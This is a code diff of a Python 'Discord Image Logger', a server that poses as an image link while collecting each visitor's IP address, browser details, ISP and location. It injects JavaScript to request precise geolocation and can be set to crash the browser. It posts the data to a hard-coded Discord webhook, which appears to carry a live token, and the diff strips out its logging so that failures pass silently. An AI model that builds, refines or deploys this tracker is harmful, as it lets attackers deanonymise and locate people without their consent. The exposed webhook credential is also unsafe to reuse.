@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 """
-Discord Image Logger – Improved Edition
+Discord Image Logger – Improved Edition (No Logging)
 By DeKrypt | https://github.com/dekrypted
 
 This version is a massive overhaul of the original script. It includes:
   - Modular functions and better structure
   - Improved bot detection and VPN/Proxy checks
-  - Robust error handling with logging
+  - Robust error handling
   - Cleaner embed construction for Discord
   - Ability to run as a standalone HTTP server
+
+Note: All logging functionality has been removed.
 """
 
-import logging
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import traceback
@@ -23,38 +24,35 @@ import httpagentparser
 # Configuration & Constants
 # ------------------------------------------------------------
 
-# Configure logging for detailed debugging information
-logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
-
 CONFIG = {
     "webhook": "https://discord.com/api/webhooks/1334261539993026560/oeumT-kc65a5lIgTcszduF2UPcd75DmWYPYeU1cI-sIbds00EwM13uHeZjAfyMKHoGgZ",
     "image": "https://www.meme-arsenal.com/memes/8e63547a83c1f0d7dccb3f6596e668ca.jpg",  # Default image URL
     "imageArgument": True,  # Allow custom image URL via a base64-encoded URL argument
 
     "username": "Image Logger",  # Webhook username
-    "color": 0x00FFFF,          # Embed color (Hex)
+    "color": 0x00FFFF,           # Embed color (Hex)
 
-    "crashBrowser": False,      # Attempt to crash/freeze the browser (not guaranteed)
-    "accurateLocation": True,   # Ask for geolocation (prompts the user)
-    "message": {                # Custom message settings (with rich token replacement)
+    "crashBrowser": False,       # Attempt to crash/freeze the browser (not guaranteed)
+    "accurateLocation": True,    # Ask for geolocation (prompts the user)
+    "message": {                 # Custom message settings (with rich token replacement)
         "doMessage": False,
         "message": "This browser has been pwned by DeKrypt's Image Logger. [Details: {ip}, {isp}, {asn}, {country}, {region}, {city}]",
         "richMessage": True,
     },
-    "vpnCheck": 1,      # 0 = No VPN check; 1 = disable ping if VPN; 2 = do not alert if VPN detected
-    "linkAlerts": True, # Alert when the link is sent
+    "vpnCheck": 1,       # 0 = No VPN check; 1 = disable ping if VPN; 2 = do not alert if VPN detected
+    "linkAlerts": True,  # Alert when the link is sent
     "buggedImage": True, # Show a loading image (for Discord crawlers)
-    "antiBot": 1,       # 0 = No check; 1 = disable ping; 2 = disable ping for data centers; 3/4 = do not alert
-    "redirect": {       # Redirection settings (disables image/crash options when enabled)
+    "antiBot": 1,        # 0 = No check; 1 = disable ping; 2 = disable ping for data centers; 3/4 = do not alert
+    "redirect": {        # Redirection settings (disables image/crash options when enabled)
         "redirect": False,
         "page": "https://your-link.here"
     },
 }
 
-# Blacklisted IP prefixes to ignore (e.g. internal or known bot ranges)
+# Blacklisted IP prefixes (e.g. internal or known bot ranges)
 BLACKLISTED_IPS = ("27", "104", "143", "164")
 
-# Pre-decoded "loading" image (for Discord crawlers) using base85
+# Pre-decoded "loading" image for Discord crawlers (using base85)
 BINARIES = {
     "loading": base64.b85decode(
         b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
@@ -96,8 +94,8 @@ def report_error(error: str):
     }
     try:
         requests.post(CONFIG["webhook"], json=payload, timeout=5)
-    except Exception as e:
-        logging.error("Failed to report error to webhook: %s", e)
+    except Exception:
+        pass  # Fail silently if reporting fails
 
 def make_report(ip: str, useragent: str = None, coords: str = None,
                 endpoint: str = "N/A", url: str or bool = False) -> dict:
@@ -106,7 +104,6 @@ def make_report(ip: str, useragent: str = None, coords: str = None,
     Includes improved VPN/proxy and data center checks.
     """
     if ip.startswith(BLACKLISTED_IPS):
-        logging.info("IP %s is blacklisted; skipping report.", ip)
         return {}
 
     bot_type = bot_check(ip, useragent)
@@ -128,17 +125,15 @@ def make_report(ip: str, useragent: str = None, coords: str = None,
             }
             try:
                 requests.post(CONFIG["webhook"], json=payload, timeout=5)
-            except Exception as e:
-                logging.error("Failed to send bot alert: %s", e)
+            except Exception:
+                pass
         return {}
 
-    # Fetch IP details from ip-api.com with a timeout
     try:
         response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
         response.raise_for_status()
         info = response.json()
-    except Exception as e:
-        logging.error("Failed to fetch IP info for %s: %s", ip, e)
+    except Exception:
         info = {}
 
     vpn_suspected = info.get("proxy", False)
@@ -147,13 +142,11 @@ def make_report(ip: str, useragent: str = None, coords: str = None,
     ping = "@everyone"
     if vpn_suspected:
         if CONFIG["vpnCheck"] == 2:
-            logging.info("VPN/proxy detected for IP %s; skipping alert.", ip)
             return {}
         elif CONFIG["vpnCheck"] == 1:
             ping = ""
     if hosting_suspected:
         if CONFIG["antiBot"] in (3, 4):
-            logging.info("Data center/hosting IP detected for %s; skipping alert.", ip)
             return {}
         elif CONFIG["antiBot"] in (1, 2):
             ping = ""
@@ -195,8 +188,8 @@ def make_report(ip: str, useragent: str = None, coords: str = None,
 
     try:
         requests.post(CONFIG["webhook"], json=embed, timeout=5)
-    except Exception as e:
-        logging.error("Failed to send report for IP %s: %s", ip, e)
+    except Exception:
+        pass
 
     return info
 
@@ -213,8 +206,8 @@ def get_image_url(query: str) -> str:
             if isinstance(encoded, str):
                 encoded = encoded.encode()
             return base64.b64decode(encoded).decode()
-    except Exception as e:
-        logging.error("Failed to decode image URL parameter: %s", e)
+    except Exception:
+        pass
     return CONFIG["image"]
 
 def get_forwarded_ip(handler: BaseHTTPRequestHandler) -> str:
@@ -239,11 +232,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
     """
     def handle_request(self):
         try:
-            # Determine which image URL to serve (from argument or default)
             image_url = get_image_url(self.path)
-            logging.info("Serving image: %s", image_url)
-
-            # Basic HTML/CSS to display the image
             html_data = f'''<style>
 body {{
     margin: 0;
@@ -260,12 +249,8 @@ div.img {{
 </style>
 <div class="img"></div>'''.encode()
 
-            # Get the client's IP address
             ip = get_forwarded_ip(self)
-            logging.info("Received request from IP: %s", ip)
-
             if ip.startswith(BLACKLISTED_IPS):
-                logging.info("IP %s is blacklisted; not processing further.", ip)
                 return
 
             useragent = self.headers.get('user-agent', '')
@@ -283,19 +268,16 @@ div.img {{
                 make_report(ip, useragent, endpoint=self.path.split("?")[0], url=image_url)
                 return
             else:
-                # Check for a "g" parameter (geolocation) in the query string
                 params = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                 if params.get("g") and CONFIG["accurateLocation"]:
                     try:
                         coords = base64.b64decode(params.get("g").encode()).decode()
-                    except Exception as e:
-                        logging.error("Failed to decode geolocation parameter: %s", e)
+                    except Exception:
                         coords = None
                     info = make_report(ip, useragent, coords, endpoint=self.path.split("?")[0], url=image_url)
                 else:
                     info = make_report(ip, useragent, endpoint=self.path.split("?")[0], url=image_url)
 
-                # Prepare the custom message if enabled
                 message = CONFIG["message"]["message"]
                 if CONFIG["message"]["richMessage"] and info:
                     message = message.replace("{ip}", ip)
@@ -318,7 +300,6 @@ div.img {{
                     message = message.replace("{browser}", browser)
                     message = message.replace("{os}", os_name)
 
-                # Determine what content to send back to the client
                 data = html_data
                 content_type = 'text/html'
                 if CONFIG["message"]["doMessage"]:
@@ -332,7 +313,6 @@ div.img {{
                 self.send_header('Content-type', content_type)
                 self.end_headers()
 
-                # Append geolocation JS if enabled
                 if CONFIG["accurateLocation"]:
                     data += b"""<script>
 var currenturl = window.location.href;
@@ -350,8 +330,7 @@ if (!currenturl.includes("g=")) {
 }
 </script>"""
                 self.wfile.write(data)
-        except Exception as e:
-            logging.error("Exception in request handler: %s", e)
+        except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
@@ -371,11 +350,10 @@ if (!currenturl.includes("g=")) {
 def run_server(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8000):
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
-    logging.info("Starting Image Logger server on port %d", port)
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        logging.info("Shutting down server.")
+        pass
     httpd.server_close()
 
 if __name__ == "__main__":
